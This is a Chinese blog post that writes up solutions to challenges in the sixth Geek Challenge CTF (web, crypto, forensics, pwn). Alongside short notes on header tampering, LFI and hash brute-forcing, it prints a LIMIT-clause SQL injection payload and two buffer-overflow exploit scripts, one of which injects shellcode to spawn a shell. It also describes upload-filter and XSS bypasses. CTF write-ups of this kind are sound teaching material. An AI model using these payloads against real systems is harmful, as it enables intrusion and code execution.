<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="第六季极客大挑战一些writeup"><meta name="keywords" content="writeup,极客大挑战"><meta name="author" content="4uuu Nya"><meta name="copyright" content="4uuu Nya"><title>第六季极客大挑战一些writeup | 4uuu Nya's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">4uuu Nya</div><div class="author-info__description text-center">愿你我即可以朝九晚五，也能够浪迹天涯</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">20</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">34</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">2</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/top_img.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">4uuu Nya's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/links">Links</a></span></div><div id="post-info"><div id="post-title">第六季极客大挑战一些writeup</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2015-10-31</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/technology/">technology</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h3 id="Vous-ferez-Fran-ais"><a href="#Vous-ferez-Fran-ais" class="headerlink" title="Vous ferez Fran?ais"></a>Vous ferez Fran?ais</h3><p>提示说需要会法语，http头中的Accept-Language就是表示语言，法语是fr-FR，修改这个提交就能拿到flag</p>
<p><img src="/images/d121e2db0075ed4067a6b1211e7d4d99.png" alt="d121e2db0075ed4067a6b1211e7d4d99.png"></p>
<h3 id="小明"><a href="#小明" class="headerlink" title="小明"></a>小明</h3><p>打开后发现url后面是file=xxx.php，感觉这就是LFI没跑了，然后在http头中发现一句话</p>
<p><code>Tips:try to read README</code></p>
<p>访问发现让读这个网页的源码，使用php伪协议读取，解base64发现flag</p>
<p><img src="/images/a49e2eb9001c04a026583cb2350f8d97.png" alt="a49e2eb9001c04a026583cb2350f8d97.png"></p>
<h3 id="http"><a href="#http" class="headerlink" title="http_"></a>http_</h3><p><img src="/images/d87bd8d43366220612649a24191f481c.png" alt="d87bd8d43366220612649a24191f481c.png"></p>
<h3 id="小明2"><a href="#小明2" class="headerlink" title="小明2"></a>小明2</h3><p>看到上面的提示是，机器人为网站工作，想到robots.txt,访问之后发现index.php.bak</p>
<p>源码中可以发现这么一段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$whattodo = <span class="string">"nothing"</span>;</span><br><span class="line">    @extract($_REQUEST);</span><br><span class="line">    <span class="keyword">if</span>($whattodo == <span class="string">"save the world!"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>是一个变量覆盖漏洞，post或者get提交whattodo=save the world!即可拿到flag</p>
<p><img src="/images/78b70f208f783a317745b2f49a0821ec.png" alt="78b70f208f783a317745b2f49a0821ec.png"></p>
<h3 id="asp你会吗"><a href="#asp你会吗" class="headerlink" title="asp你会吗"></a>asp你会吗</h3><p>看到asp文件里面是VBscript加密，解密之后看文件内容，这种在webshell里找flag的一般都是后门密码。 搜索一发pass，很快就找到flag了。</p>
<p><img src="/images/ac9bbf6efa88fb289fae3653e6ea8ca3.png" alt="ac9bbf6efa88fb289fae3653e6ea8ca3.png"></p>
<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>去微博和官微私信就能拿到flag了</p>
<p><img src="/images/23e20e241c31bf7a1e2e11d9047d0670.png" alt="23e20e241c31bf7a1e2e11d9047d0670.png"></p>
<h3 id="小彩蛋"><a href="#小彩蛋" class="headerlink" title="小彩蛋"></a>小彩蛋</h3><p><img src="/images/c9f7ee7d76798a794199de05c2bcf1d2.png" alt="c9f7ee7d76798a794199de05c2bcf1d2.png"></p>
<h3 id="神秘代码并不神秘"><a href="#神秘代码并不神秘" class="headerlink" title="神秘代码并不神秘"></a>神秘代码并不神秘</h3><p>可以看到这是一段shellcode，在网上抄了一段执行的c代码，编译运行之后发现提示段错误，然后沐师傅说，编译也要带姿势的，然后去网上找了一个编译的姿势，编译之后直接运行就打印出flag了( 必须要在32bit下才行，64bit会一直段错误的。。 )</p>
<p><img src="/images/fda8d2c22488aba76f473d9fa413f0a6.png" alt="fda8d2c22488aba76f473d9fa413f0a6.png"></p>
<h3 id="口号更新"><a href="#口号更新" class="headerlink" title="口号更新"></a>口号更新</h3><p>在zone的注释中可以看到一段提示</p>
<p><code>&lt;!--do you kown how to update slogan?  /slogan --&gt;</code></p>
<p>然后直接访问/slogan是不行的，上burp测试之后发现，是要post提交slogan这个参数，值为flag_flag_flag的时候，就可以看到打印出了flag</p>
<p><img src="/images/92ebc2d372b7ccbf857c3f9e310e3660.png" alt="92ebc2d372b7ccbf857c3f9e310e3660.png"></p>
<h3 id="饼干饼干饼干"><a href="#饼干饼干饼干" class="headerlink" title="饼干饼干饼干"></a>饼干饼干饼干</h3><p>访问之后发现提示需要从谷歌过来，那么上burp将referer改成google之后，又发现提示不是管理员，这时在cookie中发现is_admin的键值，将值改为1，再提交，得到flag</p>
<h3 id="Transposition-cipher"><a href="#Transposition-cipher" class="headerlink" title="Transposition cipher"></a>Transposition cipher</h3><p>把加密后的文档保存在1.txt中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">divide = <span class="keyword">lambda</span> t,l:[t[i:i+l] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(t),l)]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">  text = f.read()</span><br><span class="line">text = divide(text, len(text)/<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(text[<span class="number">0</span>])):</span><br><span class="line">  <span class="keyword">print</span> text[<span class="number">6</span>][i:i+<span class="number">1</span>]+text[<span class="number">5</span>][i:i+<span class="number">1</span>]+text[<span class="number">4</span>][i:i+<span class="number">1</span>]+text[<span class="number">1</span>][i:i+<span class="number">1</span>]+text[<span class="number">0</span>][i:i+<span class="number">1</span>]+text[<span class="number">2</span>][i:i+<span class="number">1</span>]+text[<span class="number">3</span>][i:i+<span class="number">1</span>], <span class="comment">#密钥是7, 6, 5, 2, 1, 3, 4</span></span><br></pre></td></tr></table></figure>
<p>跑一下就能在里面找到flag</p>
<p><img src="/images/b6d3d21f03dd79da1a08733fd3b3ae2e.png" alt="b6d3d21f03dd79da1a08733fd3b3ae2e.png"></p>
<h3 id="土豪的密码"><a href="#土豪的密码" class="headerlink" title="土豪的密码"></a>土豪的密码</h3><p>按密码学的看法来说。。。这个算法不会出两个一样的值，而且没有OTP，所以直接通过明文ascii(32, 127) 推出来每个字母加密后的密文， 通过密文的数字来倒着找明文也行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic=&#123;&#125;</span><br><span class="line">plain = <span class="string">''</span><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">  cipher = (<span class="number">7</span>*(i<span class="number">-32</span>)+<span class="number">25</span>)%<span class="number">96</span> +<span class="number">32</span></span><br><span class="line">  dic[cipher]=chr(i)</span><br><span class="line">divide = <span class="keyword">lambda</span> t,l:[t[i:i+l] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(t),l)]</span><br><span class="line">cipher = <span class="string">'2a50492e5e6f61725b4a51203e25494974227b3c72487250'</span></span><br><span class="line">cipher = divide(cipher, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(cipher)):</span><br><span class="line">  cipher[i] = string.atoi(cipher[i], <span class="number">16</span>)</span><br><span class="line">  plain += dic[cipher[i]]</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure>
<h3 id="消失的flag"><a href="#消失的flag" class="headerlink" title="消失的flag"></a>消失的flag</h3><p>根据题目提示，分析pcap包<br><code>http and http contains &quot;png&quot;</code><br>得到五个图片<br>图片的内容为5个文件的各种计算之后的值</p>
<p>毕竟Jzhou师傅有计算平台，于是….就决定了爆破sha1，其实cmd5后面四个图的密码，一条一毛而已，第一个用膝盖想想也是SYC{了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">count =<span class="number">0</span></span><br><span class="line">dic=[<span class="string">"31D413CCABE56E4949384FBEF60424795A565558"</span>, <span class="string">"138561FB21CDE19596A9CD0EE487458C6716F59A"</span>, <span class="string">"73E490E57BBEAA21C92175048151C15C18CF6E6F"</span>, <span class="string">"EB74E94271A227B241C4D631C2E98367281A4058"</span>, <span class="string">"978C3EEC59BEA942ED8B619C33544A8E5759DB27"</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">                data = chr(i)+chr(j)+chr(k)+chr(l)</span><br><span class="line">                a = hashlib.sha1(data).hexdigest().upper()</span><br><span class="line">                <span class="keyword">if</span> a <span class="keyword">in</span> dic:</span><br><span class="line">                    <span class="keyword">print</span> data +<span class="string">" "</span>+ a</span><br><span class="line">                    count+=<span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> count==<span class="number">5</span>:</span><br><span class="line">                        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h3 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h3><p>颜文字。解密后发现是console.log(“xxx”)，那么复制这一段直接放console中运行，就可以得到一串base32编码，解开就是flag</p>
<p><img src="/images/3eb9262ffc039d49b9712164b164ab60.png" alt="3eb9262ffc039d49b9712164b164ab60.png"></p>
<h3 id="大鲨鱼"><a href="#大鲨鱼" class="headerlink" title="大鲨鱼"></a>大鲨鱼</h3><p>用Wireshark打开之后直接File-&gt;Export-&gt;Objects-&gt;http，可以看到flag.jpeg.保存出来打开就能看到flag</p>
<h3 id="会不会写代码？"><a href="#会不会写代码？" class="headerlink" title="会不会写代码？"></a>会不会写代码？</h3><p>下载下来发现.git文件夹，然后git log查看一下，发现最新的commit对flag做了手脚</p>
<p>版本回退后不知道为什么没找到 Orz</p>
<p><img src="/images/60681bf8a4212085585b8c13a0037ff5.png" alt="60681bf8a4212085585b8c13a0037ff5.png"></p>
<h3 id="遗失的密码"><a href="#遗失的密码" class="headerlink" title="遗失的密码"></a>遗失的密码</h3><p>根据题意，管理员密码为’joker’+YYYYMMDD格式的字符串，这里可以用如下代码生成字典并保存在1.txt中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetimewith open(<span class="string">'1.txt'</span>,<span class="string">'r+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1970</span>,<span class="number">2015</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">      <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">          f.write(<span class="string">'joker'</span>+datetime.date(i,j,k).strftime(<span class="string">'%Y%m%d'</span>)+<span class="string">'\n'</span>)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">          <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>在制作完字典之后，我们需要把给出的那个密码串保存在pass.txt中</p>
<p>最后使用john跑一下30s左右即可得到密码</p>
<h3 id="sqli1"><a href="#sqli1" class="headerlink" title="sqli1"></a>sqli1</h3><p>加单引号之后报错了，很简单的一个sqli，直接union就好了</p>
<h3 id="sqli2"><a href="#sqli2" class="headerlink" title="sqli2"></a>sqli2</h3><p>宽字节注入</p>
<h3 id="sqli3"><a href="#sqli3" class="headerlink" title="sqli3"></a>sqli3</h3><p>一开始打开，发现没有了前面2个题的提示，不知道注入点在哪儿，只看到一张图片，<br>360那个比赛上出现过，web题的入口点全都是隐写在图片里面的，所以这次下载下来，打开发现图片最后加了提示</p>
<p><img src="/images/4a3f4ae48d25147ba7ef4c21898ea29f.png" alt="4a3f4ae48d25147ba7ef4c21898ea29f.png"></p>
<p>可以知道注入点是lalala，但是加了之后并没有什么卵用，fuzz知道他过滤了空格，而且类似%0a，换行都不起作用，感觉有毒一样，猜想是不是注入点的位置有点奇葩，柠檬牛给了个hint说这有白盒，然后在根目录下找到<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a> 解压得到一个php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filtrate</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *   此处省略</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line">$link = mysql_connect(<span class="string">'localhost'</span>,<span class="string">'xxx'</span>,<span class="string">'xxx'</span>);</span><br><span class="line"><span class="keyword">if</span>(!$link)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'error'</span>.mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">mysql_select_db(<span class="string">'sql3'</span>,$link) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">'cannot use database'</span>.mysql_error());</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]))&#123;</span><br><span class="line">    $uid = filtrate($_GET[<span class="string">'uid'</span>]);</span><br><span class="line">    $sql = <span class="string">"select content from content where id=1 order by id limit 0,$uid"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Nothing!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$result = @mysql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br><span class="line"><span class="keyword">while</span> ($row = @mysql_fetch_row($result)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $row[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">@mysql_free_result($result);</span><br><span class="line">@mysql_close($link);</span><br></pre></td></tr></table></figure>
<p>把过滤的地方给省略掉了。。 但是知道这是Limit后面的注入，于是我们可以构造出一条payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sql.sycsec.com/d07127c7c9267637d554c3f79e1ee203/?lalala=1/*a*/PROCEDURE/*a*/ANALYSE(extractvalue(1,concat(0x7e,version())),1)</span><br></pre></td></tr></table></figure>
<p>表名里面含有#，而且还过滤了空格，但是查询语句是可以这么写的 select(columns)from(table)，这么一来就bypass了空格过滤，mysql里面可以用“反引号来区别，所以构造最终爆flag的payload是(记得#要urlencode)</p>
<h3 id="SYC美男子"><a href="#SYC美男子" class="headerlink" title="SYC美男子"></a>SYC美男子</h3><p>拉进IDA之后，可以很快找到这一个关键的函数</p>
<p><img src="/images/b0b89a957cefba05bea96cef9fc8f5ea.png" alt="b0b89a957cefba05bea96cef9fc8f5ea.png"></p>
<p>在函数开头的位置，sub esp,88h 知道这个函数开了88h字节的空间，在函数开头的位置，定义了一个变量，这个变量所处位置就在栈顶，毫无检查就直接scanf，造成了栈上的一个溢出，找到getflag函数的地址08048B06，因为变量在栈顶0h处，使用88h字节的junk来填充，写一个exp(小端)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target = (<span class="string">"./pwnme"</span>) <span class="comment">#本地测试</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    io = zio(target,print_read=<span class="literal">False</span>, print_write=<span class="literal">False</span>, timeout=<span class="number">100000</span>)</span><br><span class="line">    ebp = <span class="string">'\x00\x00\x00\x00'</span>   </span><br><span class="line">    ret = l32(<span class="number">0x08048B06</span>)</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x88</span>+ebp+ret</span><br><span class="line">    io.read_until(<span class="string">"&gt;&gt; 6. Exit"</span>)</span><br><span class="line">    io.writeline(<span class="string">'5'</span>)</span><br><span class="line">    io.read_until(<span class="string">"Input his name :"</span>)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line">    io.interact()</span><br></pre></td></tr></table></figure>
<h3 id="SYC美男子二"><a href="#SYC美男子二" class="headerlink" title="SYC美男子二"></a>SYC美男子二</h3><p>让拿shell，然而一开始入坑了，scanf是不能接收0a 0b 0c 00这些字符的，所以用msf生成一段规避这些字符的shellcode，然后再junk+jmp esp+shellcode就可以拿到shell了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target = (<span class="string">"./pwnme"</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    io = zio(target,print_read=<span class="literal">False</span>, print_write=<span class="literal">False</span>, timeout=<span class="number">100000</span>)</span><br><span class="line">    ret = l32(<span class="number">0x0805888d</span>)</span><br><span class="line">    shellcode=<span class="string">""</span></span><br><span class="line">    shellcode+=<span class="string">"\x31\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"</span></span><br><span class="line">    shellcode+=<span class="string">"\xdb\xd9\xe0\x04\x83\xee\xfc\xe2\xf4\xb1\xd2\xb8\x9d\x89\xbf"</span></span><br><span class="line">    shellcode+=<span class="string">"\x88\x29\xb8\x50\x07\x6c\xf4\xaa\x88\x04\xb3\xf6\x82\x6d\xb5"</span></span><br><span class="line">    shellcode+=<span class="string">"\x50\x03\x56\x33\xd1\xe0\x04\xdb\xf6\x82\x6d\xb5\xf6\x93\x6c"</span></span><br><span class="line">    shellcode+=<span class="string">"\xdb\x8e\xb3\x8d\x3a\x14\x60\x04"</span></span><br><span class="line">    payload = <span class="string">'A'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+ret+shellcode</span><br><span class="line">    io.read_until(<span class="string">"&gt;&gt; 6. Exit"</span>)</span><br><span class="line">    io.writeline(<span class="string">'5'</span>)</span><br><span class="line">    io.read_until(<span class="string">"Input his name :"</span>)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line">    io.interact()</span><br></pre></td></tr></table></figure>
<h3 id="bypass-it"><a href="#bypass-it" class="headerlink" title="bypass it"></a>bypass it</h3><p>一道bypass上传的题，番茄师傅刚发出来就有人截图说秒了 ，一下子就慌了，一开始想复杂了，随便传了一个文件之后发现给出了路径，但是这没什么卵用，正常传了一个php文件发现提示是。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php is the best programing language</span><br></pre></td></tr></table></figure></p>
<p>于是改后缀为php3,4,5成功</p>
<h3 id="三叶草留言板"><a href="#三叶草留言板" class="headerlink" title="三叶草留言板"></a>三叶草留言板</h3><p>string.fromCharCode 可以过</p>
<h3 id="Dede"><a href="#Dede" class="headerlink" title="Dede"></a>Dede</h3><p>根目录下有web.zip， 发现主页存在一个后门，ph老师博客有讲到</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">4uuu Nya</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://qvq.im/2015/10/31/第六季极客大挑战一些writeup/">https://qvq.im/2015/10/31/第六季极客大挑战一些writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/writeup/">writeup</a><a class="post-meta__tags" href="/tags/极客大挑战/">极客大挑战</a></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2016/05/12/sctf-2016-一点小笔记/"><i class="fa fa-chevron-left">  </i><span>sctf 2016 一点小笔记</span></a></div><div class="next-post pull-right"><a href="/2015/08/31/ICMS-V6-0-8一处设计缺陷导致sql注入/"><span>ICMS V6.0.8一处设计缺陷导致sql注入</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/top_img.png)"><div class="layout" id="footer"><div class="copyright">&copy;2015 - 2019 By 4uuu Nya</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>